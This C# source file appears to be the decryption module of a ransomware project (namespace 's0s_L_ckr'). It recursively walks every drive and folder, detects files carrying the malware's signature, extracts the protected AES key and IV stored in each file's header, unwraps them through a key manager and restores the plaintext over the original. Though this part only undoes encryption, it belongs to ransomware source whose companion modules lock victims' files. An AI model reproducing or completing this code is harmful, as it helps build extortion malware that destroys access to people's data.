using System;
using System.IO;

namespace s0s_L_ckr;

public sealed class DecStr
{
	public void DecrDis()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		CriptoKeyMgr.RotAesKey();
		DriveInfo[] array = drives;
		foreach (DriveInfo drive in array)
		{
			DecrDrv(drive);
		}
	}

	private void DecrDrv(DriveInfo drive)
	{
		if (drive.IsReady)
		{
			DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo in array)
			{
				DecrDir(directoryInfo);
			}
		}
	}

	private void DecrDir(DirectoryInfo directoryInfo)
	{
		if (!Comn.DireInFil(directoryInfo.FullName))
		{
			return;
		}
		try
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			if (directories != null)
			{
				DirectoryInfo[] array = directories;
				foreach (DirectoryInfo directoryInfo2 in array)
				{
					DecrDir(directoryInfo2);
				}
			}
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array2 = files;
			foreach (FileInfo file in array2)
			{
				DecrFil(file);
			}
		}
		catch (Exception)
		{
		}
	}

	private void DecrFil(FileInfo file)
	{
		if (Comn.CheckSig(file))
		{
			byte[] key = null;
			byte[] iv = null;
			byte[] fileDat = null;
			string text = file.FullName + ".wrk";
			FileMgr.ReadFil(file, ref fileDat);
			int fILE_SIGN_SIZE = ConfigMgr.FILE_SIGN_SIZE;
			byte[] protKey = new byte[CriptoKeyMgr.CURR_FIL_ENC_KEY.Length];
			Array.Copy(fileDat, fILE_SIGN_SIZE, protKey, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);
			int sourceIndex = fILE_SIGN_SIZE + protKey.Length;
			byte[] protIv = new byte[CriptoKeyMgr.CURR_FIL_ENC_IV.Length];
			Array.Copy(fileDat, sourceIndex, protIv, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);
			CriptoKeyMgr.UnprotectAesKey(ref protKey, ref key, ref protIv, ref iv);
			using (FileStream fileStream = File.Create(text))
			{
				fileStream.Position = 0L;
				CriptoFilMgr.Decrypt(fileStream, ref fileDat, ConfigMgr.FILE_SIGN_SIZE + protKey.Length + protIv.Length, key, iv);
			}
			file.Delete();
			File.Copy(text, file.FullName);
			File.Delete(text);
		}
		else
		{
			Console.WriteLine("Files not encrypted");
		}
	}
}
